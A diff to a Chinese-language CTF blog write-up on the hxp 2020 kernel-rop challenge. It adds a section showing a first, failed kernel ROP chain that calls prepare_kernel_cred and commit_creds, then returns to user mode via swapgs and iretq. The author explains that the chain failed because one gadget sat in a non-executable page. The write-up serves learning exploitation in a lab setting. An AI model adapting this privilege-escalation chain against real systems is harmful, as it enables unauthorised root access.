@@ -13,6 +13,7 @@ comments: true
   - [5.1 smep的原理](#51-smep的原理)
   - [5.2 ROP + native\_write\_cr4 + ret2usr(已失效)](#52-rop--native_write_cr4--ret2usr已失效)
   - [5.3 ROP提权](#53-rop提权)
+    - [5.3.1 错误的尝试：gadget在不可执行的page中](#531-错误的尝试gadget在不可执行的page中)
 
 
 # 例题: hxp 2020 kernel-rop<br>
@@ -355,6 +356,25 @@ sp
 ss
 ```
 ROP的逻辑是很简单的，但是实际上很难找到能用的gadget完成利用<br>
+### 5.3.1 错误的尝试：gadget在不可执行的page中<br>
+我第一个找到的rop链如下所示：<br>
+```c
+    unsigned long pop_rdi_ret = 0xffffffff81006370;
+    unsigned long push_rax_pop_rdi_ret = 0xffffffff81e5f09c;  // 位于NX page中
+    unsigned long swapgs_pop_rbp_ret = 0xffffffff8100a55f;
+    unsigned long iretq = 0xffffffff8100c0d9;
+    tmp_buf[off++] = pop_rdi_ret;
+    tmp_buf[off++] = 0;
+    tmp_buf[off++] = prepare_kernel_cred;
+    tmp_buf[off++] = push_rax_pop_rdi_ret;
+    tmp_buf[off++] = commit_creds;
+    tmp_buf[off++] = swapgs_pop_rbp_ret;
+    tmp_buf[off++] = 0; 
+    tmp_buf[off++] = iretq;
+```
+很可惜的是**push rax; pop rdi; ret**所在位置为不可执行的page中，所以执行报错。<br>
+![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2026-4-26/20260829003025.png)
+`ROPgadget`在搜索gadget的时候并不会考虑gadget是否位于可执行的page中，所以这是个麻烦。<br>
 
 
 <!-- Google tag (gtag.js) -->
